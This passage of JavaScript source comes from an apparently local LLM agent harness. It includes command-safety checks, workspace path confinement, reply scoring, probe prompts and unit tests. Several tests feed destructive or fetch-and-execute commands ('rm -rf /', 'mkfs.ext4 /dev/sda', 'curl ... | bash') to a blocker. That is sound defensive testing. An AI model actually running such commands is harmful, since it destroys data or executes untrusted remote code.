  if (opts.done) return endReport(opts.plan, result, opts.cwd) || "That’s done.";
  if (/^ls\b/.test(cmd)) {
    const where = (cmd.match(/\s(\/\S+)\s*$/) || [])[1] || "the current directory";
    return "Listed " + where + ".";
  }
  const opened = cmd.match(/open\('([^']+)'/);
  if (opened) {
    const full = path.isAbsolute(opened[1]) || !opts.cwd ? opened[1] : path.join(opts.cwd, opened[1]);
    return (/\.pdf$/i.test(opened[1]) ? "The PDF is at " : "Wrote ") + full + ".";
  }
  const step = opts.step;
  return step && step.do ? String(step.do).replace(/\.$/, "") + "." : "Done with that step.";
}

function finishReport(plan, result) {
  const step = currentStep(plan);
  if (!step || step.status === "ok" || step.cmd) return null;
  if (/pdf|write /i.test(String(step.do || ""))) return null;
  if (!/report|short name|summary/i.test(String(step.do || "") + " " + String(step.expect || ""))) return null;
  const text = shortListing((result && result.stdout) || "");
  if (!text) return null;
  return { text: text, plan: advance(mark(plan, step.id, "ok"), "next") };
}

function currentStep(plan) {
  if (!plan || !plan.steps || plan.cursor < 0 || plan.cursor >= plan.steps.length) return null;
  return plan.steps[plan.cursor];
}

function mark(plan, id, status) {
  return { ...plan, steps: plan.steps.map((s) => (s.id === id ? { ...s, status } : s)) };
}

function advance(plan, next) {
  if (next === "done") return { ...plan, cursor: plan.steps.length };
  if (next === "next") return { ...plan, cursor: Math.min(plan.cursor + 1, plan.steps.length) };
  const idx = plan.steps.findIndex((s) => s.id === next);
  return idx >= 0 ? { ...plan, cursor: idx } : { ...plan, cursor: Math.min(plan.cursor + 1, plan.steps.length) };
}

function assertSafeCmd(cmd) {
  const s = String(cmd || "").trim();
  if (!s) throw new Error("empty command");
  if (/[\n\r]/.test(s)) throw new Error("multi-line commands blocked");
  if (DENY_CMD.test(s)) throw new Error("blocked command: " + s);
  return s;
}

function safeRelPath(p, root) {
  if (typeof p !== "string" || !p.trim()) throw new Error("bad path");
  if (path.isAbsolute(p)) throw new Error("absolute paths not allowed");
  const resolved = path.resolve(root, p);
  const prefix = root.endsWith(path.sep) ? root : root + path.sep;
  if (resolved !== root && !resolved.startsWith(prefix)) throw new Error("path escapes workspace");
  return resolved;
}

function recordWrite(ledger, stepId, abs, before) {
  const snap = { path: abs, before };
  const last = ledger[ledger.length - 1];
  if (last && last.stepId === stepId) last.snaps.push(snap);
  else ledger.push({ stepId, snaps: [snap] });
}

function rollbackAfter(ledger, keepStepId) {
  const keepIdx = keepStepId ? ledger.findIndex((e) => e.stepId === keepStepId) : -1;
  const undo = ledger.slice(keepIdx + 1).reverse();
  for (const entry of undo) {
    for (const snap of [...entry.snaps].reverse()) {
      try {
        if (snap.before == null) fs.unlinkSync(snap.path);
        else fs.writeFileSync(snap.path, snap.before, "utf8");
      } catch (_) {}
    }
  }
  return keepIdx >= 0 ? ledger.slice(0, keepIdx + 1) : [];
}

function estimatePrompt(context, user, extra) {
  const chars = SYSTEM_A.length + String(context || "").length + String(user || "").length + String(extra || "").length + 160;
  const tokens = Math.ceil(chars / 4);
  return { chars, tokens, numCtx: NUM_CTX, pct: Math.round((tokens / NUM_CTX) * 100) };
}

function scoreModelReply(parsed, rawText) {
  const isObj = parsed && typeof parsed === "object";
  const checks = [
    { name: "parsed object", ok: isObj },
    { name: "has display", ok: isObj && typeof parsed.display === "string" && parsed.display.length > 0 },
    { name: "display is PING-OK", ok: isObj && /PING-OK/i.test(String(parsed.display)) },
    { name: "not raw fallback", ok: isObj && !parsed._raw },
    { name: "no denied commands", ok: !DENY_CMD.test(String((parsed && parsed.cmd) || "")) },
    { name: "reply not huge", ok: String(rawText || "").length < 2000 },
  ];
  return { ok: checks.every((c) => c.ok), passed: checks.filter((c) => c.ok).length, total: checks.length, checks, display: parsed && parsed.display };
}

function diagnoseReply(kind, raw) {
  const trimmed = String(raw || "").trim();
  const start = clip(trimmed.replace(/\s+/g, " "), 90);
  if (!trimmed) return "empty reply";
  const parsed = extractJson(trimmed);
  if (parsed._raw) {
    if (trimmed.includes("{") && !trimmed.includes("}")) return "JSON started but was cut off before }. Starts: " + start;
    if (!trimmed.includes("{")) return "prose, no JSON object. Starts: " + start;
    return "has { but it is not valid JSON. Starts: " + start;
  }
  const keys = Object.keys(parsed).filter((k) => k !== "_raw").join(", ") || "(none)";
  if (kind === "direct") {
    if (typeof parsed.display !== "string" || !parsed.display.trim()) return "JSON has no display. Keys: " + keys;
    return "JSON display ok";
  }
  if (kind === "plan") {
    const steps = Array.isArray(parsed.steps) ? parsed.steps : [];
    if (!steps.length) return "JSON has no steps. Keys: " + keys;
    if (steps.some((s) => !s || !String((s && (s.do || s.text)) || "").trim())) return "a step has no action";
    return steps.length + " steps";
  }
  if (kind === "check") {
    const flag = asOk(parsed.ok);
    if (flag === null) return "JSON has no usable ok. Keys: " + keys;
    return "ok is " + flag;
  }
  if (kind === "emit") {
    const cmd = typeof parsed.cmd === "string" ? parsed.cmd.trim() : "";
    const ask = typeof parsed.ask === "string" ? parsed.ask.trim() : "";
    if (!cmd && !ask) return "JSON has neither cmd nor ask. Keys: " + keys;
    return cmd ? "command: " + clip(cmd, 70) : "asks: " + clip(ask, 70);
  }
  if (kind === "think") {
    const reason = typeof parsed.reason === "string" ? parsed.reason.trim() : "";
    const cmd = typeof parsed.cmd === "string" ? parsed.cmd.trim() : "";
    if (!reason) return "JSON has no reason. Keys: " + keys;
    if (!cmd) return "reason but no command. It did not decide to read the file. Reason: " + clip(reason, 80);
    if (!/lib\.js/.test(cmd)) return "command does not read lib.js: " + clip(cmd, 70);
    return "reason and a read command";
  }
  if (kind === "ask") {
    const display = typeof parsed.display === "string" ? parsed.display.trim() : "";
    const cmd = typeof parsed.cmd === "string" ? parsed.cmd.trim() : "";
    const reason = typeof parsed.reason === "string" ? parsed.reason.trim() : "";
    if (cmd) return "invented a command for a question: " + clip(cmd, 70);
    if (!display && !reason) return "no answer. Keys: " + keys;
    return "answers without a command";
  }
  if (kind === "say") {
    const say = typeof parsed.say === "string" ? parsed.say.trim() : "";
    if (!say) return "JSON has no say. Keys: " + keys;
    if (/\b(KEEP|FACT|NEXT)\b/.test(say)) return "report recites state: " + clip(say, 80);
    if (!/localTurn|speak/.test(say)) return "report ignores the output. Starts: " + clip(say, 80);
    return "reports the output";
  }
  if (kind === "note") {
    const note = typeof parsed.note === "string" ? parsed.note.trim() : "";
    if (!note) return "JSON has no note. Keys: " + keys;
    if (/\b(KEEP|FACT|NEXT)\b/.test(note)) return "note recites state";
    if (/[{}]/.test(note) || /^\s*(function|def)\b/.test(note) || note.length > 240) return "note pastes the source";
    return "one short note";
  }
  if (kind === "verdict") {
    const flag = asOk(parsed.ok);
    const why = typeof parsed.why === "string" ? parsed.why.trim() : "";
    if (flag !== false) return "did not reject a failed command. ok=" + flag;
    if (!why || /^one line\.?$/i.test(why)) return "rejected without a real reason";
    return "rejects the error";
  }
  if (kind === "concat") {
    const reason = typeof parsed.reason === "string" ? parsed.reason.trim() : "";
    const display = typeof parsed.display === "string" ? parsed.display.trim() : "";
    const cmd = typeof parsed.cmd === "string" ? parsed.cmd.trim() : "";
    if (!reason) return "JSON has no reason. Keys: " + keys;
    if (!cmd && !/python/.test(display)) return "reason but no python command. Reason: " + clip(reason, 80);
    if (display.startsWith("{")) return "display is raw JSON";
    return "python command with a reason";
  }
  if (kind === "code") {
    const display = typeof parsed.display === "string" ? parsed.display.trim() : "";
    const cmd = typeof parsed.cmd === "string" ? parsed.cmd.trim() : "";
    if (cmd) return "put the program in a command instead of the answer: " + clip(cmd, 70);
    if (!display || /:\s*$/.test(display)) return "introduction only, the program is missing";
    if (!/#include|printf|puts/.test(display)) return "answer has no C program. Starts: " + clip(display, 80);
    return "shows the program";
  }
  return "unknown probe";
}

function formatSession(info) {
  const lines = [
    "local-loop session",
    "model: " + ((info && info.model) || ""),
    "cwd: " + ((info && info.cwd) || ""),
    "time: " + ((info && info.time) || ""),
    "",
    "== events ==",
  ];
  const events = (info && info.events) || [];
  if (!events.length) lines.push("(no conversation yet)");
  events.slice(0, 200).forEach((e, i) => {
    lines.push("");
    lines.push("--- " + (i + 1) + " " + (e.kind || "note") + " " + (e.t || "") + " ---");
    lines.push(clip(String(e.text || ""), 4000) || "(empty)");
  });
  lines.push("");
  lines.push("== current state ==");
  lines.push(String((info && info.state) || "").trim() || "(empty)");
  if (info && info.plan) {
    lines.push("");
    lines.push("== current plan ==");
    lines.push(clip(String(info.plan), 4000));
  }
  lines.push("");
  lines.push("== end ==");
  return lines.join("\n");
}

function formatReport(info) {
  const unit = (info && info.unit) || { passed: 0, total: 0, results: [] };
  const lines = [
    "local-loop report",
    "model: " + ((info && info.model) || ""),
    "cwd: " + ((info && info.cwd) || ""),
    "time: " + ((info && info.time) || ""),
    "",
    "== diagnosis ==",
    "Paste this report into the chat.",
  ];
  const probes = info && info.probes ? info.probes : [];
  if (!probes.length) lines.push("(no model probes)");
  probes.forEach((p) => {
    lines.push((p.ok ? "OK  " : "FAIL") + "  " + (p.kind || p.name || "probe") + " — " + (p.diagnosis || p.detail || ""));
    const extra = [];
    if (p.ms != null) extra.push(p.ms + " ms");
    extra.push(String(p.raw || "").length + " chars");
    if (p.predict) extra.push("predict " + p.predict);
    lines.push("    " + extra.join(", "));
  });
  lines.push("");
  lines.push("== unit ==");
  lines.push(unit.passed + "/" + unit.total);
  const failed = (unit.results || []).filter((r) => !r.ok);
  if (!failed.length) lines.push("all unit checks passed");
  failed.forEach((r) => lines.push("FAIL " + r.name + " — " + (r.detail || "fail")));
  (info && info.probes ? info.probes : []).forEach((p) => {
    lines.push("");
    lines.push("== " + (p.kind || p.name || "probe") + " ==");
    lines.push("ok: " + !!p.ok);
    lines.push("diagnosis: " + (p.diagnosis || p.detail || ""));
    lines.push("--- system ---");
    lines.push(String(p.system || ""));
    lines.push("--- user ---");
    lines.push(String(p.user || ""));
    lines.push("--- raw ---");
    lines.push(clip(String(p.raw || ""), 8000));
  });
  lines.push("");
  lines.push("== end ==");
  return lines.join("\n");
}

function scoreWorkflow(kind, raw) {
  const diagnosis = diagnoseReply(kind, raw);
  const parsed = extractJson(raw);
  let name = kind;
  let ok = false;
  let detail = diagnosis;
  if (parsed._raw) {
    detail = diagnosis;
  } else if (kind === "direct") {
    name = "Direct";
    ok = typeof parsed.display === "string" && parsed.display.trim().length > 0;
    detail = ok ? "answers in JSON" : diagnosis;
  } else if (kind === "plan") {
    name = "Plan";
    const steps = Array.isArray(parsed.steps) ? parsed.steps : [];
    ok = steps.length >= 1 && steps.every((s) => s && String(s.do || s.text || "").trim());
    detail = ok ? steps.length + " steps" : diagnosis;
  } else if (kind === "check") {
    name = "Check";
    ok = asOk(parsed.ok) !== null;
    detail = ok ? "can judge a step" : diagnosis;
  } else if (kind === "emit") {
    name = "Emit";
    const cmd = typeof parsed.cmd === "string" && parsed.cmd.trim();
    const ask = typeof parsed.ask === "string" && parsed.ask.trim();
    ok = !!(cmd || ask);
    detail = ok ? (cmd ? "returns a command" : "asks a question") : diagnosis;
  } else if (kind === "think") {
    name = "Think";
    const reason = typeof parsed.reason === "string" && parsed.reason.trim();
    const cmd = typeof parsed.cmd === "string" ? parsed.cmd.trim() : "";
    ok = !!(reason && cmd && /lib\.js/.test(cmd));
    detail = ok ? "decides to read the file" : diagnosis;
  } else if (kind === "ask") {
    name = "Ask";
    const display = typeof parsed.display === "string" && parsed.display.trim();
    const reason = typeof parsed.reason === "string" && parsed.reason.trim();
    const cmd = typeof parsed.cmd === "string" ? parsed.cmd.trim() : "";
    ok = !cmd && !!(display || reason);
    detail = ok ? "answers without a command" : diagnosis;
  } else if (kind === "say") {
    name = "Say";
    const say = typeof parsed.say === "string" ? parsed.say.trim() : "";
    ok = !!say && !/\b(KEEP|FACT|NEXT)\b/.test(say) && /localTurn|speak/.test(say);
    detail = ok ? "reports the output" : diagnosis;
  } else if (kind === "note") {
    name = "Note";
    const note = typeof parsed.note === "string" ? parsed.note.trim() : "";
    ok = !!note && note.length <= 240 && !/\b(KEEP|FACT|NEXT)\b/.test(note) && !/[{}]/.test(note) && !/^\s*(function|def)\b/.test(note);
    detail = ok ? "short note" : diagnosis;
  } else if (kind === "verdict") {
    name = "Verdict";
    const why = typeof parsed.why === "string" ? parsed.why.trim() : "";
    ok = asOk(parsed.ok) === false && !!why && !/^one line\.?$/i.test(why);
    detail = ok ? "rejects the error" : diagnosis;
  } else if (kind === "concat") {
    name = "Concat";
    const reason = typeof parsed.reason === "string" && parsed.reason.trim();
    const display = typeof parsed.display === "string" ? parsed.display.trim() : "";
    const cmd = typeof parsed.cmd === "string" ? parsed.cmd.trim() : "";
    const body = cmd || display;
    ok = !!(reason && /python/.test(body) && !display.startsWith("{"));
    detail = ok ? "python command" : diagnosis;
  } else if (kind === "code") {
    name = "Code";
    const display = typeof parsed.display === "string" ? parsed.display.trim() : "";
    const cmd = typeof parsed.cmd === "string" ? parsed.cmd.trim() : "";
    ok = !cmd && !/:\s*$/.test(display) && /#include|printf|puts/.test(display);
    detail = ok ? "shows the program" : diagnosis;
  } else {
    detail = "unknown probe";
  }
  return { name, ok, detail, diagnosis };
}

const WORKFLOW_PROBES = [
  { kind: "direct", system: SYSTEM_A, user: "Say hello. No shell command.\nThe first character of your reply is {.", predict: 120 },
  { kind: "plan", system: SYSTEM_PLAN, user: "User: list /tmp and then write a one-page PDF summary of the names.", predict: 420 },
  {
    kind: "check",
    system: SYSTEM_CHECK,
    user: "Expect: names from /tmp\nCommand: ls -la /tmp\nExit: 0\nOutput:\nalpha\nbeta\nThe first character of your reply is {.",
    predict: 80,
  },
  {
    kind: "emit",
    system: SYSTEM_EMIT,
    user: "State:\nKEEP GOAL: write a pdf\nFACT: names (2): alpha, beta\n\nStep 2: Write a PDF summary of those names\nNeed: FACT names\nExpect: pdf file exists",
    predict: 180,
  },
  {
    kind: "think",
    system: SYSTEM_THINK,
    user: "User: read this file and report /tmp/lib.js\nThe first character of your reply is {.",
    predict: 220,
  },
  {
    kind: "ask",
    system: SYSTEM_THINK,
    user: "User: what is 2+2\nThe first character of your reply is {.",
    predict: 120,
  },
  {
    kind: "say",
    system: SYSTEM_SAY,
    user: "Task: read this file and report /tmp/lib.js\nCommand: sed -n '1,40p' /tmp/lib.js\nOutput:\nfunction localTurn(text) {\n  return 1;\n}\nfunction speak(opts) {}\nThe first character of your reply is {.",
    predict: 200,
  },
  {
    kind: "note",
    system: SYSTEM_NOTE,
    user: "Task: summarize lib.js\nPart 1 of 3:\nfunction localTurn(text) {\n  return 1;\n}\nThe first character of your reply is {.",
    predict: 80,
  },
  {
    kind: "verdict",
    system: SYSTEM_CHECK,
    user: "Task: concatenate the files\nExpect: one python command ran\nWhat came back:\npython3: can't open file 'missing.py': [Errno 2] No such file or directory\nThe first character of your reply is {.",
    predict: 80,
  },
  {
    kind: "concat",
    system: SYSTEM_THINK,
    user: "User: write a short python command to concatenate all files in a directory.\nThe first character of your reply is {. Keep the JSON short.",
    predict: 220,
  },
  {
    kind: "code",
    system: SYSTEM_THINK,
    user: "User: write a simple C program that prints hello world\nThe first character of your reply is {.",
    predict: 400,
  },
];

function runUserScenarios() {
  return USER_SCENARIOS.map((s) => {
    let ok = false;
    try {
      ok = s.harness ? !!s.pass() : !!s.pass(s.fixture);
    } catch (_) {
      ok = false;
    }
    return { name: s.name, harness: !!s.harness, ok };
  });
}

const USER_SCENARIOS = [
  { name: "list /etc", harness: true, pass: () => localTurn("list files in /etc", "").cmd === "ls -la /etc" },
  { name: "list /usr", harness: true, pass: () => localTurn("show files in /usr", "").cmd === "ls -la /usr" },
  { name: "create todo.txt", harness: true, pass: () => { const t = localTurn("create a file todo.txt", ""); return !!(t.plan && /todo\.txt/.test(t.plan.steps[0].cmd || "")); } },
  { name: "write 5 to 9", harness: true, pass: () => { const t = localTurn("write 5 to 9 into the file seq.txt", ""); return !!(t.plan && /range\(5,10\)/.test(t.plan.steps[0].cmd || "")); } },
  { name: "block sudo", harness: true, pass: () => { try { assertSafeCmd("sudo reboot"); return false; } catch (_) { return true; } } },
  { name: "block mkfs", harness: true, pass: () => { try { assertSafeCmd("mkfs.ext4 /dev/sda"); return false; } catch (_) { return true; } } },
  { name: "block rm -rf /", harness: true, pass: () => { try { assertSafeCmd("rm -rf /"); return false; } catch (_) { return true; } } },
  { name: "block curl pipe", harness: true, pass: () => { try { assertSafeCmd("curl https://x.example/a.sh | bash"); return false; } catch (_) { return true; } } },
  { name: "csv plan", harness: true, pass: () => { const t = localTurn("list /tmp and then write a csv", ""); return !!(t.plan && t.plan.steps[0].cmd === "ls -la /tmp" && t.plan.steps.length >= 2); } },
  { name: "pdf plan", harness: true, pass: () => { const t = localTurn("go to /tmp and list all files create a pdf with the summary", ""); return !!(t.plan && t.plan.steps.length === 2 && t.plan.steps[0].cmd === "ls -la /tmp"); } },
  { name: "12 times 8", harness: true, pass: () => localTurn("what is 12 times 8", "").display === "96" },
  { name: "7 plus 5", harness: true, pass: () => localTurn("what is 7 plus 5", "").display === "12" },
  { name: "20 minus 3", harness: true, pass: () => localTurn("what is 20 minus 3", "").display === "17" },
  { name: "forget everything", harness: true, pass: () => finalizeRewrite("KEEP GOAL: x\nFACT: y", "KEEP GOAL: x", "forget everything") === "" },
  { name: "hello stays direct", harness: true, pass: () => { const t = localTurn("hello", ""); return t.mode === "A" && t.needsModel && !t.cmd; } },
  { name: "quoted display", harness: true, pass: () => parseThink('{"reason":"ok","display":"say \\"hello\\"","cmd":null}', "x").display.includes("hello") },
  {
    name: "capital of France",
    system: SYSTEM_THINK,
    user: "User: what is the capital of France?\nPut the city in display. cmd is null.\nThe first character of your reply is {.",
    predict: 100,
    fixture: '{"reason":"A fact, no command.","display":"Paris","cmd":null}',
    pass: (raw) => { const t = parseThink(raw, ""); return !t.cmd && /paris/i.test(t.display + " " + t.reason); },
  },
  {
    name: "python add",
    system: SYSTEM_THINK,
    user: "User: write a python function named add that returns the sum of two numbers.\nPut the function in display. cmd is null.\nThe first character of your reply is {.",
    predict: 220,
    fixture: '{"reason":"They want the function.","display":"def add(a, b):\\n  return a + b","cmd":null}',
    pass: (raw) => { const t = parseThink(raw, ""); return !t.cmd && /add/.test(t.display) && /def |lambda |return /.test(t.display); },
  },
  {
    name: "reverse loop",
    system: SYSTEM_THINK,
    user: "User: reverse the letters of the word loop.\nPut only the reversed word in display. cmd is null.\nThe first character of your reply is {.",
    predict: 80,
    fixture: '{"reason":"Letter order.","display":"pool","cmd":null}',
    pass: (raw) => { const t = parseThink(raw, ""); return !t.cmd && /\bpool\b/i.test(t.display); },
  },
  {
    name: "read data.txt",
    system: SYSTEM_THINK,
    user: "User: read /tmp/data.txt and report it.\nYou have not read it. Put one read command in cmd.\nThe first character of your reply is {.",
    predict: 140,
    fixture: '{"reason":"The file has not been read.","display":"I will read it.","cmd":"cat /tmp/data.txt"}',
    pass: (raw) => { const t = parseThink(raw, ""); return !!(t.cmd && /data\.txt/.test(t.cmd) && !DENY_CMD.test(t.cmd)); },
  },
  {
    name: "count lines",
    system: SYSTEM_THINK,
    user: "User: how many lines are in /tmp/data.txt?\ncmd is one shell command that counts lines.\nThe first character of your reply is {.",
    predict: 140,
    fixture: '{"reason":"Need a count.","display":"I will count the lines.","cmd":"wc -l /tmp/data.txt"}',
    pass: (raw) => { const t = parseThink(raw, ""); return !!(t.cmd && /data\.txt/.test(t.cmd) && /wc|python|grep/.test(t.cmd)); },
  },
  {
    name: "grep error",
    system: SYSTEM_THINK,
    user: "User: find the lines containing error in /tmp/app.log.\ncmd is one grep or rg command.\nThe first character of your reply is {.",
    predict: 140,
    fixture: '{"reason":"Need the matching lines.","display":"I will search the log.","cmd":"grep error /tmp/app.log"}',
    pass: (raw) => { const t = parseThink(raw, ""); return !!(t.cmd && /app\.log/.test(t.cmd) && /\b(grep|rg)\b/.test(t.cmd)); },
  },
  {
    name: "explain pwd",
    system: SYSTEM_THINK,
    user: "User: in one sentence, what does the pwd command print?\ncmd is null.\nThe first character of your reply is {.",
    predict: 140,
    fixture: '{"reason":"No command is needed.","display":"pwd prints the current directory.","cmd":null}',
    pass: (raw) => { const t = parseThink(raw, ""); return !t.cmd && t.display.length > 12 && !/\b(KEEP|FACT|NEXT)\b/.test(t.display) && /director|path|folder|where/i.test(t.display); },
  },
  {
    name: "say disk full",
    system: SYSTEM_SAY,
    user: "Task: what went wrong\nOutput:\nerror: disk full\nThe first character of your reply is {.",
    predict: 80,
    fixture: '{"say":"The disk is full."}',
    pass: (raw) => { const say = String(extractJson(raw).say || ""); return /disk/i.test(say) && !/\b(KEEP|FACT|NEXT)\b/.test(say); },
  },
  {
    name: "note backup",
    system: SYSTEM_NOTE,
    user: "Task: summarize the log\nPart 1 of 2:\nbackup finished, 3 files copied\nThe first character of your reply is {.",
    predict: 80,
    fixture: '{"note":"The backup finished and copied 3 files."}',
    pass: (raw) => { const note = String(extractJson(raw).note || ""); return note.length > 8 && note.length < 240 && !/[{}]/.test(note) && /backup|copied|files/i.test(note); },
  },
  {
    name: "verdict denied",
    system: SYSTEM_CHECK,
    user: "Task: read the log\nExpect: file contents\nWhat came back:\ncat: /tmp/app.log: Permission denied\nThe first character of your reply is {.",
    predict: 80,
    fixture: '{"ok":false,"why":"Permission denied"}',
    pass: (raw) => { const v = parseVerdict(raw); return !!(v && v.ok === false && v.why && !/^one line\.?$/i.test(v.why)); },
  },
  {
    name: "sort three numbers",
    system: SYSTEM_THINK,
    user: "User: sort these numbers from small to large: 9, 2, 4.\nPut them in display in that order. cmd is null.\nThe first character of your reply is {.",
    predict: 100,
    fixture: '{"reason":"Sort ascending.","display":"2, 4, 9","cmd":null}',
    pass: (raw) => { const t = parseThink(raw, ""); const d = t.display; return !t.cmd && d.indexOf("2") >= 0 && d.indexOf("2") < d.indexOf("9"); },
  },
  {
    name: "bash loop",
    system: SYSTEM_THINK,
    user: "User: write a bash for-loop that prints 1 2 3.\nPut the loop in display. cmd is null.\nThe first character of your reply is {.",
    predict: 180,
    fixture: '{"reason":"They want the loop text.","display":"for n in 1 2 3; do echo $n; done","cmd":null}',
    pass: (raw) => { const t = parseThink(raw, ""); return !t.cmd && /for /.test(t.display) && /1/.test(t.display); },
  },
  {
    name: "date command",
    system: SYSTEM_THINK,
    user: "User: which one shell command prints today's date?\nPut that command in cmd.\nThe first character of your reply is {.",
    predict: 100,
    fixture: '{"reason":"date prints it.","display":"Use date.","cmd":"date"}',
    pass: (raw) => { const t = parseThink(raw, ""); return !!(t.cmd && /\bdate\b/.test(t.cmd) && !DENY_CMD.test(t.cmd)); },
  },
  {
    name: "os info",
    system: SYSTEM_THINK,
    user: "User: display information about this os\nThe first character of your reply is {.",
    predict: 160,
    fixture: '{"reason":"Need the kernel and the distro from this machine.","display":"I will ask the system.","cmd":"uname -a"}',
    pass: (raw) => {
      const t = parseThink(raw, "display information about this os");
      return !!(t.cmd && !/lib\.js/.test(t.cmd) && !copiedFromPrompt("display information about this os", t) && /uname|os-release|hostnamectl|lsb_release/.test(t.cmd));
    },
  },
];

function runUnitTests() {
  const results = [];
  const check = (name, ok, detail) => results.push({ name, ok: !!ok, detail: detail || (ok ? "ok" : "fail") });
  runUserScenarios().forEach((s) => check("scenario " + s.name, s.ok));
  check("pickMode A", pickMode("what is 2+2", "").mode === "A");
  check("pickMode B", pickMode("list /tmp then zip a csv", "").mode === "B");
  check("pdf prompt is a plan", pickMode("go to /tmp and list all files create a pdf with the summary", "").mode === "B");
  const listTmp = heuristicPlan("go to /tmp and list all files");
  check("list /tmp has a command", listTmp && listTmp.steps.length === 1 && listTmp.steps[0].cmd === "ls -la /tmp");
  const speed = [
    ["go to /tmp and list all files", "ls -la /tmp"],
    ["list all files", "ls -la"],
    ["ls /tmp", "ls -la /tmp"],
    ["list files in /tmp", "ls -la /tmp"],
  ];
  speed.forEach(function (row) {
    const got = localTurn(row[0], "");
    check("speedrun " + row[0], !got.needsModel && got.cmd === row[1], got.needsModel ? "asked the model" : got.cmd);
  });
  const foo = localTurn('create a file "foo.txt" and write there number 0 -> 100 inside.', "");
  check("speedrun numbered file", !foo.needsModel && /range\(0,101\)/.test(foo.cmd || ""), foo.needsModel ? "asked the model" : foo.cmd);
  const pdf = localTurn("go to /tmp and list all files create a pdf with the summary", "");
  check("speedrun pdf stays two steps", pdf.plan && pdf.plan.steps.length === 2 && pdf.plan.steps[0].cmd === "ls -la /tmp");
  check("speedrun chat asks the model", localTurn("what is 2+2", "").display === "4" && localTurn("what is 2+2", "").needsModel === false);
  const thought = localTurn("go to /tmp and list all files", "");
  check("reason before list", /names in \/tmp/.test(thought.reason) && !/KEEP GOAL|FACT:/.test(thought.reason));
  const pdfThought = localTurn("go to /tmp and list all files create a pdf with the summary", "");
  check("reason before steps", /2 steps/.test(pdfThought.reason) && /List \/tmp/.test(pdfThought.reason));
  const readThought = parseThink(
    '{"reason":"The file has not been read, so I cannot report it yet.","display":"I will read it first.","cmd":"sed -n \'1,80p\' /tmp/lib.js"}',
    "read this file and report /tmp/lib.js"
  );
  check(
    "model thinks of the read",
    readThought.plan && readThought.plan.fromModel && /sed/.test(readThought.cmd) && /not been read/.test(readThought.reason) && !/don't already know/.test(readThought.reason)
  );
  const cut = parseThink('{"reason":"I need the files.","display', "concat files");
  check("cut off reply keeps the reason", cut.failed === true && cut.reason === "I need the files." && !cut.cmd);
  const numbers = heuristicPlan('create a file "foo.txt" and write there number 0 -> 100 inside.');
  check(
    "numbers file command",
    numbers && numbers.steps.length === 1 && /foo\.txt/.test(numbers.steps[0].cmd) && /range\(0,101\)/.test(numbers.steps[0].cmd) && !/\n/.test(numbers.steps[0].cmd)
  );
  check("cmd null is not a reply", cleanDisplay("cmd null", "Plan ready.") === "Plan ready.");
  const report = formatReport({
    model: "qwen",
    cwd: "/tmp/loop-test",
    time: "t",
    unit: { passed: 1, total: 2, results: [{ name: "sample", ok: false, detail: "no" }] },
    probes: [{ kind: "direct", ok: false, detail: "no JSON", system: "SYS", user: "USER", raw: "hello" }],
  });
  check("report export", /== diagnosis ==/.test(report) && /FAIL  direct — no JSON/.test(report) && /--- raw ---\nhello/.test(report));
  check("diagnose prose", /prose/.test(scoreWorkflow("direct", "Hello there").diagnosis));
  check("diagnose cut off", /cut off/.test(scoreWorkflow("check", '{"ok":true').diagnosis));
  const session = formatSession({
    model: "qwen",
    cwd: "/tmp/loop-x",
    time: "t",
    events: [{ kind: "you", t: "t1", text: "write foo.txt" }, { kind: "state", t: "t2", text: "KEEP GOAL: write foo.txt" }],
    state: "KEEP GOAL: write foo.txt",
    plan: "1 [todo] Write foo.txt",
  });
  check("session export", /== events ==/.test(session) && /--- 1 you t1 ---/.test(session) && /write foo.txt/.test(session) && /== current plan ==/.test(session));
  check("empty model plan", parsePlan("cmd null", "create a file").steps.length === 0);
  check("no goal drops", finalizeRewrite("", "FACT: x", "hi") === "");
  check("heuristic rewrite skip", heuristicRewrite("", "ls /tmp", "list") === "");
  const kept = finalizeRewrite("KEEP GOAL: inspect /tmp", "FACT: aider", "add");
  check("keep goal", /KEEP GOAL/.test(kept) && /aider/.test(kept));
  check("extractJson", extractJson('{"display":"hi","cmd":null}').display === "hi");
  check("direct cmd alias", parseDirect('{"display":"ok","commands":["ls -la /tmp"]}').cmd === "ls -la /tmp");
  check("summarize ls", /aider/.test(summarizeOutput("ls -la /tmp", "total 1\ndrwx aider")));
  const many = Array.from({ length: 20 }, (_, i) => "f" + i).join("\n");
  check("summarize ls caps", /\+8/.test(summarizeOutput("ls /tmp", many)) && summarizeOutput("ls /tmp", many).length < 200);
  check("deny sudo", (() => { try { assertSafeCmd("sudo ls"); return false; } catch (_) { return true; } })());
  const p = heuristicPlan("list /tmp then write a report");
  check("heuristic plan", p && p.steps.length === 2);
  const pdfPlan = heuristicPlan("go to /tmp and list all files then create a pdf with a summary of what is there");
  check("pdf plan", pdfPlan && /PDF/.test(pdfPlan.goal) && pdfPlan.steps[1].cmd == null && /PDF/.test(pdfPlan.steps[1].do));
  const stated = stepState(pdfPlan, pdfPlan.steps[0], { cmd: "ls -la /tmp", code: 0, stdout: "alpha\nbeta\n" }, true);
  check("state keeps next", /KEEP GOAL: list \/tmp/.test(stated) && /NEXT: Write a PDF/.test(stated) && /FACT:/.test(stated));
  const withNote = mark(pdfPlan, "1", "ok");
  withNote.steps[0].note = "names (2): alpha, beta";
  const retried = stepState(withNote, withNote.steps[1], { cmd: "python3 -c open", code: 1, stdout: "" }, false, "");
  check("listing fact survives retry", /alpha, beta/.test(retried));
  check("workflow direct", scoreWorkflow("direct", '{"display":"hi","cmd":null}').ok === true);
  check("workflow junk", scoreWorkflow("direct", "not json").ok === false);
  check("workflow think reads", scoreWorkflow("think", '{"reason":"The file has not been read.","display":"I will read it first.","cmd":"sed -n \'1,80p\' /tmp/lib.js"}').ok === true);
  check("workflow think echo fails", scoreWorkflow("think", '{"reason":"ok","display":"/tmp/lib.js","cmd":null}').ok === false);
  check("workflow ask stays quiet", scoreWorkflow("ask", '{"reason":"No command is needed.","display":"4","cmd":null}').ok === true);
  check("workflow ask no command", scoreWorkflow("ask", '{"reason":"I will list it.","display":"ok","cmd":"ls /tmp"}').ok === false);
  check("workflow say reports", scoreWorkflow("say", '{"say":"The file defines localTurn and speak."}').ok === true);
  check("workflow say not state", scoreWorkflow("say", '{"say":"KEEP GOAL: read it. NEXT: done."}').ok === false);
  check("workflow note is short", scoreWorkflow("note", '{"note":"This part defines a function localTurn that returns 1."}').ok === true);
  check("workflow note rejects a paste", scoreWorkflow("note", '{"note":"function localTurn(text) { return 1; }"}').ok === false);
  check("workflow verdict rejects", scoreWorkflow("verdict", '{"ok":false,"why":"the script was missing"}').ok === true);
  check("workflow verdict placeholder", scoreWorkflow("verdict", '{"ok":false,"why":"one line"}').ok === false);
